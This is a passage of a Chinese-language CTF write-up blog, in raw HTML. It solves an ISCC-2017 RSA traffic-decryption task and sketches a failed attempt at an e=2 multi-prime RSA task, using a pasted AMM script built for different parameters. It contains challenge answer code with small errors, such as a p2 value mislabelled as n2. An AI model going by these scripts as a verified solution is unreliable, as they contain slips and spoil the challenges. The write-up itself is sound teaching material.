punctuation">.</span>b16decode<span class="token punctuation">(</span>hex_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/04/01/5554a3d8ef34b656.png" alt="" /></p>
<h2 id="iscc-2017说我作弊需要证据"><a class="anchor" href="#iscc-2017说我作弊需要证据">#</a> ISCC-2017 说我作弊需要证据</h2>
<p>​           题目描述：X 老师怀疑一些调皮的学生在一次自动化计算机测试中作弊，他使用抓包工具捕获到了 Alice 和 Bob 的通信流量。狡猾的 Alice 和 Bob 同学好像使用某些加密方式隐藏通信内容，使得 X 老师无法破解它，也许你有办法帮助 X 老师。X 老师知道 Alice 的 RSA 密钥为 (n, e) = (0x53a121a11e36d7a84dde3f5d73cf, 0x10001)  (192.168.0.13)?,Bob 的 RSA 密钥为 (n, e) =(0x99122e61dc7bede74711185598c7,  0x10001) (192.168.0.37)</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/02/7ed2231b7048e094.png" alt="" /></p>
<p>看看流量包，好像有 base64 欸，加上题目里给我们的 N1、N2，和 e，N 可以分解一下吧，分以下好了。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#Alice's</span></pre></td></tr><tr><td data-num="2"></td><td><pre>n1 <span class="token operator">=</span> <span class="token number">1696206139052948924304948333474767</span></pre></td></tr><tr><td data-num="3"></td><td><pre>p1 <span class="token operator">=</span> <span class="token number">38456719616722997</span></pre></td></tr><tr><td data-num="4"></td><td><pre>q1 <span class="token operator">=</span> <span class="token number">44106885765559411</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#Bob's</span></pre></td></tr><tr><td data-num="6"></td><td><pre>n2 <span class="token operator">=</span> <span class="token number">3104649130901425335933838103517383</span></pre></td></tr><tr><td data-num="7"></td><td><pre>n2 <span class="token operator">=</span> <span class="token number">49662237675630289</span></pre></td></tr><tr><td data-num="8"></td><td><pre>q2 <span class="token operator">=</span> <span class="token number">62515288803124247</span></pre></td></tr></table></figure><p>也就是说少个 C 呗，不知道他们俩传的啥？其实都在流量包里。</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/02/9c66f081520f38d8.png" alt="" /></p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>SEQ = 13; DATA = 0x3b04b26a0adada2f67326bb0c5d6L; SIG = 0x2e5ab24f9dc21df406a87de0b3b4L;</pre></td></tr><tr><td data-num="2"></td><td><pre>SEQ = 0; DATA = 0x7492f4ec9001202dcb569df468b4L; SIG = 0xc9107666b1cc040a4fc2e89e3e7L;</pre></td></tr><tr><td data-num="3"></td><td><pre>SEQ = 5; DATA = 0x94d97e04f52c2d6f42f9aacbf0b5L; SIG = 0x1e3b6d4eaf11582e85ead4bf90a9L;</pre></td></tr><tr><td data-num="4"></td><td><pre>SEQ = 4; DATA = 0x2c29150f1e311ef09bc9f06735acL; SIG = 0x1665fb2da761c4de89f27ac80cbL;</pre></td></tr><tr><td data-num="5"></td><td><pre>SEQ = 18; DATA = 0x181901c059de3b0f2d4840ab3aebL; SIG = 0x1b8bdf9468f81ce33a0da2a8bfbeL;</pre></td></tr><tr><td data-num="6"></td><td><pre>SEQ = 2; DATA = 0x8a03676745df01e16745145dd212L; SIG = 0x1378c25048c19853b6817eb9363aL;</pre></td></tr><tr><td data-num="7"></td><td><pre>SEQ = 20; DATA = 0x674880905956979ce49af33433L; SIG = 0x198901d5373ea225cc5c0db66987L;</pre></td></tr><tr><td data-num="8"></td><td><pre>SEQ = 0; DATA = 0x633282273f9cf7e5a44fcbe1787bL; SIG = 0x2b15275412244442d9ee60fc91aeL;</pre></td></tr><tr><td data-num="9"></td><td><pre>SEQ = 28; DATA = 0x19688f112a61169c9090a4f9918dL; SIG = 0x1448ac6eee2b2e91a0a6241e590eL;</pre></td></tr><tr><td data-num="10"></td><td><pre>SEQ = 24; DATA = 0x59d0264d4a134fa5a91521b25e46L; SIG = 0x2bc3bf947c0e85444aa13efa1c15L;</pre></td></tr></table></figure><p>DATA 是密文，SIG 用来签名校验</p>
<p>然后就是，Alice 是加密方，所以我们要用 Bob 的私钥来解密。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#Alice's</span></pre></td></tr><tr><td data-num="5"></td><td><pre>n1 <span class="token operator">=</span> <span class="token number">1696206139052948924304948333474767</span></pre></td></tr><tr><td data-num="6"></td><td><pre>p1 <span class="token operator">=</span> <span class="token number">38456719616722997</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q1 <span class="token operator">=</span> <span class="token number">44106885765559411</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#Bob's</span></pre></td></tr><tr><td data-num="9"></td><td><pre>n2 <span class="token operator">=</span> <span class="token number">3104649130901425335933838103517383</span></pre></td></tr><tr><td data-num="10"></td><td><pre>p2 <span class="token operator">=</span> <span class="token number">49662237675630289</span></pre></td></tr><tr><td data-num="11"></td><td><pre>q2 <span class="token operator">=</span> <span class="token number">62515288803124247</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>e<span class="token operator">=</span><span class="token number">65537</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>d1<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>d2<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>c<span class="token operator">=</span><span class="token number">0x19688f112a61169c9090a4f9918d</span></pre></td></tr><tr><td data-num="19"></td><td><pre>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#print( long_to_bytes(m))</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\lenovo\Desktop\data.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>cips<span class="token operator">=</span>data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>cips<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">for</span> cip <span class="token keyword">in</span> cips<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    data<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cip<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    seq<span class="token operator">=</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'= '</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>    cipher<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    sig<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token comment"># print(cipher)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>d2<span class="token punctuation">,</span>n2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">if</span> m<span class="token operator">==</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>sig<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        flag<span class="token punctuation">[</span>seq<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="卷王杯签到"><a class="anchor" href="#卷王杯签到">#</a> 卷王杯 — 签到</h2>
<h3 id="encryptpy"><a class="anchor" href="#encryptpy">#</a> <span class="exturl" data-url="aHR0cDovL2VuY3J5cHQucHk=">encrypt.py</span></h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> secrets <span class="token keyword">import</span> p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">,</span>flag</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r <span class="token operator">*</span> s <span class="token operator">*</span> t</pre></td></tr><tr><td data-num="5"></td><td><pre>e <span class="token operator">=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>r<span class="token punctuation">,</span>s<span class="token punctuation">,</span>t<span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="13"></td><td><pre>145332367700944303747548912160113939198078051436029477960348968315913956664143693347226702600438608693933768134575289286283267810723137895903153829001826223446477799895493265422562348917012216790077395795861238257357035152687833639085415763850743538206986781418939737511715957738982536382066693822159860701263</pre></td></tr><tr><td data-num="14"></td><td><pre>116660458253067608044065523310547233337730583902133756095473339390057738510707447906971188577217274861047379404014140178165569604404468897712846876108444468370709141219302291601408652742006268186059762087155933131837323952675627966299810891805398890428420575425160696531236660480933905879208166090591482794763</pre></td></tr><tr><td data-num="15"></td><td><pre>157931722402853245421436270609912823260313730941283152856444641969403238646482562190531038393124087232554754746464603598717356255570166081501573727336977292059427220330169044611674973569766966838498453232642731737958791706086957762244686953294662693939604300864961637325536379321027705854708492453330690705531</pre></td></tr><tr><td data-num="16"></td><td><pre>100973451687449518854742673778783266158999451072058606348222018797891147675959983616210003484476577612134482311993701677242007759556951494382833070563369964294544839433671087037596159753825249018950693369209927951667775267086896180395776150188902057785214767230658487267587289809918132337927575673868568976679</pre></td></tr><tr><td data-num="17"></td><td><pre>93960345071948255233882121683650797512129333868351496468898834736770441398743300745703393838320587998953678254272245400344928586394089488734271897540051673996675973642347859306921527430850673334243441180183460927865980713929789963587608547554858491264614271309608925634272282292964002897650355047792764365447</pre></td></tr><tr><td data-num="18"></td><td><prepre></td></tr><tr><td data-num="19"></td><td><pre>'''</span></pre></td></tr></table></figure><p>没做出来但是我先讲一下我的思路叭。</p>
<p>首先看到 e=2 第一个秒想到的是 c 开方，不对。</p>
<p>再次就是 rabin 攻击，但这也不是普通的 rabin 啊</p>
<p>这个情况<strong> e | phi (n)</strong>，太怪了是不是？e 成了 phi 的因数，无法互素。之前遇到过 AMM 算法，解决的就是 e、phi 不互素问题，还能开根。好，问题来了，我不会用。。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">AMM</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> r<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    g <span class="token operator">=</span> GF<span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    o <span class="token operator">=</span> g<span class="token punctuation">(</span>o<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    p <span class="token operator">=</span> g<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> p <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> r<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        p <span class="token operator">=</span> g<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    t <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    s <span class="token operator">=</span> q <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> s <span class="token operator">%</span> r <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        t <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        s <span class="token operator">=</span> s <span class="token operator">//</span> r</pre></td></tr><tr><td data-num="17"></td><td><pre>    k <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> r <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        k <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    alp <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> s <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> r</pre></td></tr><tr><td data-num="21"></td><td><pre>    a <span class="token operator">=</span> p <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">**</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    b <span class="token operator">=</span> o <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">*</span>alp <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    c <span class="token operator">=</span> p <span class="token operator">^</span> s</pre></td></tr><tr><td data-num="24"></td><td><pre>    h <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        d <span class="token operator">=</span> b <span class="token operator">^</span> <span class="token punctuation">(</span>r<span class="token operator">^</span><span class="token punctuation">(</span>t<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            j <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            j <span class="token operator">=</span> <span class="token operator">-</span> discrete_log<span class="token punctuation">(</span>d<span class="token punctuation">,</span> a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        b <span class="token operator">=</span> b <span class="token operator">*</span> <span class="token punctuation">(</span>c<span class="token operator">^</span>r<span class="token punctuation">)</span><span class="token operator">^</span>j</pre></td></tr><tr><td data-num="32"></td><td><pre>        h <span class="token operator">=</span> h <span class="token operator">*</span> c<span class="token operator">^</span>j</pre></td></tr><tr><td data-num="33"></td><td><pre>        c <span class="token operator">=</span> c<span class="token operator">^</span>r</pre></td></tr><tr><td data-num="34"></td><td><pre>    result <span class="token operator">=</span> o<span class="token operator">^</span>alp <span class="token operator">*</span> h</pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">return</span> result</pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">def</span> <span class="token function">findAllPRoot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    proot <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>proot<span class="token punctuation">)</span> <span class="token operator">&lt;</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        proot<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>e<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">return</span> proot</pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token keyword">def</span> <span class="token function">findAllSolutions</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> proot<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    all_mp <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">for</span> root <span class="token keyword">in</span> proot<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        mp2 <span class="token operator">=</span> mp <span class="token operator">*</span> root <span class="token operator">%</span> p</pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>mp2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> cp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        all_mp<span class="token punctuation">.</span>add<span class="token punctuation">(</span>mp2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">return</span> all_mp</pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>c <span class="token operator">=</span> <span class="token number">15433214846771804225704093824935372144929516863829752998270111032551363583267576397009018518790803908369965458162930857063271509296349091229352855725285388975497906340053281554202527432848881160125418406408621879995822551367228501163128699032015069585502994319524445505522625561831240862136447585120010288772692097621553249775117843166714346924868089146429002417223863834435968726551668931140147337199939823985783939085842479154589529244209712172799274024573845157268545992888944742377166586536479490962335287124809557709167220756920767331929168230518135523463578566851417486746667008938122693256033127001185017237773</span></pre></td></tr><tr><td data-num="53"></td><td><pre>p <span class="token operator">=</span> <span class="token number">0xa892eb59b175bcf896be2176598f278437fe10ef032279f06e1092143acfb3c16b31811cca5286699595c2720c652ee64f8adc92c8b16a5601dd981d6f839ce9c0513db30de88c2ec6cae1a726acbd235ea946631bde633707d766287a2f075e9aace1606bd8b4f52d4f5b87dfb81f14fbc5338004575e9430257e180a169eff</span></pre></td></tr><tr><td data-num="54"></td><td><pre>q <span class="token operator">=</span> <span class="token number">0xe3d47225b77e56129dc3fed716181845f89fa15b2eb35453ffdc0f05cdf57c0d90410911d209818e886b202bc4893ebe85a07ef670122f0e70092de1b7963c3b24a58c6a9ec9ed677db3473b1882d10d550e45c18fd57b85a70a5401a074d36760e85c7e6258f0ab08fa69cd433709910fad6e145f7b85f589e83d61d3baf6ad</span></pre></td></tr><tr><td data-num="55"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="56"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x3</span></pre></td></tr><tr><td data-num="57"></td><td><pre>cp <span class="token operator">=</span> c <span class="token operator">%</span> p</pre></td></tr><tr><td data-num="58"></td><td><pre>cq <span class="token operator">=</span> c <span class="token operator">%</span> q</pre></td></tr><tr><td data-num="59"></td><td><pre>mp <span class="token operator">=</span> AMM<span class="token punctuation">(</span>cp<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>mq <span class="token operator">=</span> AMM<span class="token punctuation">(</span>cq<span class="token punctuation">,</span> e<span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>p_proot <span class="token operator">=</span> findAllPRoot<span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>q_proot <span class="token operator">=</span> findAllPRoot<span class="token punctuation">(</span>q<span class="token punctuation">,</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>mps <span class="token operator">=</span> findAllSolutions<span class="token punctuation">(</span>mp<span class="token punctuation">,</span> p_proot<span class="token punctuation">,</span> cp<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>mqs <span class="token operator">=</span> findAllSolutions<span class="token punctuation">(</span>mq<span class="token punctuation">,</span> q_proot<span class="token punctuation">,</span> cq<span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"mps="</span><span class="token punctuation">,</span>mps<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"mqs="</span><span class="token punctuation">,</span>mqs<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token keyword">for</span> mpp <span class="token keyword">in</span> mps<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    <span class="token keyword">for</span> mqq <span class="token keyword">in</span> mqs<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        solution <span class="token operator">=</span> CRT_list<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>mpp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mqq<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>solution<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag="</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>flag<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token 